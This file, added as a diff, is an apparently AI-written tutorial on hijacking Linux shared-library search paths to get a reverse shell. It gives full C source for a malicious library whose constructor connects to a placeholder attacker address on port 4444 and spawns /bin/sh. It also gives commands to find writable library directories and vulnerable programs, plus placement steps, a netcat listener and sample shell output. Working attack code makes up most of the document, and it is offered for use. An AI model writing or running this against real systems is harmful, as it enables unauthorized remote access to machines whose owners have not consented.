@@ -1,0 +1,181 @@
+Below is an example of exploiting **Exploiting Weak Permissions in Library Search Paths** to achieve a reverse shell on a Linux target. This technique involves placing a malicious shared library in a directory with weak permissions that is included in the library search path, causing a target program to load it instead of the legitimate library. I’ll also include helpful commands to identify a suitable target, as requested.
+
+
+### How It Works
+1. The dynamic linker (`ld.so`) searches for shared libraries in a predefined order, including paths like `/usr/local/lib`.
+2. If a directory in the search path (e.g., `/usr/local/lib`) is writable, you can place a malicious library with the same name as a legitimate one.
+3. When the target program runs, it loads your malicious library, and the constructor function `init()` executes, spawning the reverse shell.
+
+---
+
+### Helpful Commands for Identifying Targets
+- **Find writable library directories**:
+  ```bash
+  find /lib /usr/lib /usr/local/lib -type d -writable
+  ```
+  Lists directories in common library paths you can write to.
+
+- **Check default library search paths**:
+  ```bash
+  ldconfig -v 2>/dev/null | grep -v ^$ | grep -v ^\s
+  ```
+  Shows directories configured in `/etc/ld.so.conf`.
+
+- **Trace library loading in real-time**:
+  ```bash
+  strace -e open,openat /path/to/target_program 2>&1 | grep ".so"
+  ```
+  Identifies which `.so` files are opened and their paths.
+
+- **Find programs missing a library (potential hijack opportunity)**:
+  ```bash
+  ldd /usr/bin/* 2>/dev/null | grep "not found" | awk '{print $NF}'
+  ```
+  If a library is missing, you can create a malicious version in a writable path.
+
+---
+
+### Limitations and Notes
+- **Permissions**: Requires write access to a directory in the library search path (e.g., `/usr/local/lib`). System paths like `/lib` typically require root.
+- **Library Naming**: The malicious library must match the exact name expected by the program (e.g., `libcustom.so`).
+- **Firewall**: The target must allow outbound connections to your IP and port.
+- **Detection**: Placing new files in monitored directories could trigger security alerts.
+- **Cleanup**: Remove the malicious library after testing:
+  ```bash
+  rm /usr/local/lib/libcustom.so
+  ```
+
+
+### Prerequisites
+1. **Attacker Machine**: A system listening for the reverse shell (e.g., using `netcat`).
+2. **Target Machine**: A Linux system with a program that loads libraries from a writable directory in its search path (e.g., `/usr/local/lib`).
+3. **Compiler**: `gcc` to build the malicious library.
+4. **Permissions**: Write access to a directory in the library search path.
+
+---
+
+### Step-by-Step Example
+
+#### 1. **Create the Malicious Shared Library**
+Create a C file (e.g., `malicious_lib.c`) with the following code:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+void __attribute__((constructor)) init() {
+    // Create a socket
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in server;
+
+    // Configure the reverse shell target (attacker's IP and port)
+    server.sin_family = AF_INET;
+    server.sin_port = htons(4444);              // Port 4444
+    server.sin_addr.s_addr = inet_addr("ATTACKER_IP"); // Replace with attacker's IP
+
+    // Connect to the attacker's machine
+    connect(sock, (struct sockaddr *)&server, sizeof(server));
+
+    // Redirect stdin, stdout, and stderr to the socket
+    dup2(sock, 0); // stdin
+    dup2(sock, 1); // stdout
+    dup2(sock, 2); // stderr
+
+    // Execute a shell
+    execve("/bin/sh", NULL, NULL);
+}
+```
+
+- Replace `"ATTACKER_IP"` with your attacker machine’s IP (e.g., `192.168.1.100`).
+
+#### 2. **Compile the Malicious Library**
+Compile it into a shared library, naming it to match a library the target program depends on (e.g., `libcustom.so`):
+
+```bash
+gcc -shared -fPIC -o libcustom.so malicious_lib.c
+```
+
+- You’ll determine the exact library name using the target identification commands below.
+
+#### 3. **Identify a Suitable Target Program and Writable Directory**
+Use these commands to find a program and a writable directory in its library search path:
+
+- **Check library dependencies**:
+  ```bash
+  ldd /path/to/target_program
+  ```
+  Example output:
+  ```
+  libcustom.so => /usr/local/lib/libcustom.so
+  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
+  ```
+  Note the library path (e.g., `/usr/local/lib`).
+
+- **Check directory permissions**:
+  ```bash
+  ls -ld /usr/local/lib
+  ```
+  If it’s writable (e.g., `drwxrwxrwx` or owned by your user), it’s a candidate. For this example, assume `/usr/local/lib` is writable.
+
+- **Trace library search path**:
+  ```bash
+  LD_DEBUG=libs /path/to/target_program 2>&1 | grep 'search path'
+  ```
+  Example output:
+  ```
+  search path=/usr/local/lib:/lib:/usr/lib
+  ```
+  Confirm the writable directory (e.g., `/usr/local/lib`) is in the path.
+
+- **Find programs using a specific directory**:
+  ```bash
+  ldd /bin/* /usr/bin/* 2>/dev/null | grep "/usr/local/lib" | awk '{print $NF}'
+  ```
+  Lists programs loading libraries from `/usr/local/lib`.
+
+For this example, assume `/usr/bin/vuln_app` loads `libcustom.so` from `/usr/local/lib`, which is writable.
+
+#### 4. **Place the Malicious Library in the Writable Directory**
+Move your malicious library to the target directory:
+
+```bash
+cp libcustom.so /usr/local/lib/libcustom.so
+```
+
+- Ensure permissions match typical libraries:
+  ```bash
+  chmod 755 /usr/local/lib/libcustom.so
+  ```
+
+#### 5. **Set Up the Listener on the Attacker Machine**
+Start a `netcat` listener on your attacker machine:
+
+```bash
+nc -lvnp 4444
+```
+
+#### 6. **Run the Target Program**
+Execute the target program on the target machine:
+
+```bash
+/usr/bin/vuln_app
+```
+
+- When the program loads `libcustom.so` from `/usr/local/lib`, it uses your malicious version, triggering the reverse shell.
+
+#### 7. **Receive the Reverse Shell**
+On the attacker machine, your `netcat` listener should receive the connection:
+
+```
+$ nc -lvnp 4444
+Listening on [0.0.0.0] (port 4444)
+Connection from [TARGET_IP] port 4444 [tcp/*] accepted
+whoami
+target_user
+```
+
+---
+
